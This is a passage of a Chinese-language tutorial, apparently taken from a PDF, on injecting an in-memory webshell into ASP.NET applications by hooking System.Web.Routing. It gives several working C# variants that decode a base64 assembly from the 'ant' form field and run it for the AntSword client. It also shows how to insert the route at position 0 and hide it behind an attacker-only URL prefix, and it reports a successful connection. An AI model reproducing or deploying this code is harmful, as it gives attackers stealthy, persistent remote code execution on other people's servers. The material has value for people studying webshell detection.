4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
7
那么到底哪个函数会更先被调⽤呢？我在两个函数，以及Controller⾥分别加了⼀条打印的语句。 
优先级 
C++
复制代码
public class MyRoute : RouteBase
    {
        public override RouteData GetRouteData(HttpContextBase 
httpContext)
        {
            return null;
        }
        public override VirtualPathData GetVirtualPath(RequestContext 
requestContext, RouteValueDictionary values)
        {
            HttpContext context = HttpContext.Current;
            String Payload = context.Request.Form["ant"];
            if (Payload != null)
            {
                System.Reflection.Assembly assembly = 
System.Reflection.Assembly.Load(Convert.FromBase64String(Payload));
                assembly.CreateInstance(assembly.GetName().Name + 
".Run").Equals(context);
                context.Response.End();
            }
            return null;
        }
    }
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
8
发现顺序是 GetRouteData>Controller>GetVirtualPath，所以还是GetRouteData⽐较好⽤。 
另⼀种做法就是沿着现有实现类Route的逻辑来⾛。 
、 
他的构造类需要两个参数，第⼀个是url pattern，第⼆个是对应的处理handler。 
实现IRouteHandler接⼝需要实现GetHttpHandler⽅法，需要返回⼀个实现了IHttpHandler的handler 
这⾥其实⼜有不同的操作了，内存⻢的本质是我们把恶意的代码注⼊到了⼀个每次Web请求都会触发的
地⽅。 
所以我们既可以在RouteHandler中添加恶意逻辑，也可以在实现的HttpHandler⾥加恶意逻辑。 
利⽤System.Web.Routing.Route 
注⼊RouteHandler 
9
报错不影响连接，如果有强迫症可以实现⼀个空的IHttpHandler。 
主要逻辑在ProcessRequest⾥，这是第四种写法 
注⼊HttpHandler 
C++
复制代码
    public class MyRoute : IRouteHandler
    {
        public IHttpHandler GetHttpHandler(RequestContext requestContext)
        {
            HttpContext context = HttpContext.Current;
            String Payload = context.Request.Form["ant"];
            if (Payload != null)
            {
                System.Reflection.Assembly assembly = 
System.Reflection.Assembly.Load(Convert.FromBase64String(Payload));
                assembly.CreateInstance(assembly.GetName().Name + 
".Run").Equals(context);
                context.Response.End();
            }
            return null;
        }
    }
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
10
⽂档：https://docs.microsoft.com/zh-cn/dotnet/api/system.web.routing.route.url?
view=netframework-3.5#System_Web_Routing_Route_Url 
路由问题 
C++
复制代码
public class MyRoute : IRouteHandler
    {
        public IHttpHandler GetHttpHandler(RequestContext requestContext)
        {
            return new Myhandler(requestContext);
        }
    }
    public class Myhandler : IHttpHandler
    {
        public RequestContext RequestContext { get; private set; }
        public Myhandler(RequestContext context)
        {
            this.RequestContext = context;
        }
        public void ProcessRequest(HttpContext context)
        {
            String Payload = context.Request.Form["ant"];
            if (Payload != null)
            {
                System.Reflection.Assembly assembly = 
System.Reflection.Assembly.Load(Convert.FromBase64String(Payload));
                assembly.CreateInstance(assembly.GetName().Name + 
".Run").Equals(context);
                context.Response.End();
            }
            context.Response.End();
        }
        public bool IsReusable
        {
            get { return false; }
        }
    }
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
11
Route的URL默认没有正则，不能像java⼀样直接指定/*，但是可以⽤{xxx}来表示任意变量 
在此为了不影响业务，我们选择⼀个只有⾃⼰知道的开头的字符串 
这样任意/mr6xxxxx 都可以连接。 
跟mvc的filter不同的是，Route的add⽅法没有order参数的选项，所以依然要考虑如何把我们的shell添
加到第⼀位的问题。 
RouteCollection本质是个Collection，所以只需要调⽤Insert⽅法，并且指定位置为0即可把我们的shell
添加到第⼀位。 
⾄此我们的内存⻢⼤业就算完成了。 
访问注⼊内存⻢的aspx，⼀⽚空⽩说明注⼊成功 
蚁剑中输⼊任意url，连接成功。 
添加到第⼀位 
测试 
C++
复制代码
将值分配给 Url 属性时，在 / 分析 URL 时，字符被解释为分隔符。 使⽤⼤括号 ({}) 来定义称
为 URL 参数的变量。 将 URL 中的匹配段的值分配给 URL 参数。 Url未括在⼤括号中的属性中的
任何值都将被视为⽂本常量。
?不允许在属性中使⽤该字符 Url 。 必须通过分隔符或⽂本常量分隔每个 URL 段。 可以将 {{ 
或 }} ⽤作⼤括号字符的转义符。
1
2
C++
复制代码
new Route("mr6{page}", new MyRoute())
1
C++
复制代码
RouteCollection routes = RouteTable.Routes;
routes.Insert(0, (RouteBase)new MyRoute());
1
2
12
https://docs.microsoft.com/zh-cn/dotnet/api/system.web.routing.route?view=netframework-
3.5 
https://www.cnblogs.com/liangxiaofeng/p/5619866.html 
https://www.programminghunter.com/article/8505151604/ 
https://github.com/knownsec/KCon/blob/master/2021/%E9%AB%98%E7%BA%A7%E6%94%
BB%E9%98%B2%E6%BC%94%E7%BB%83%E4%B8%8B%E7%9A%84Webshell.pdf 
参考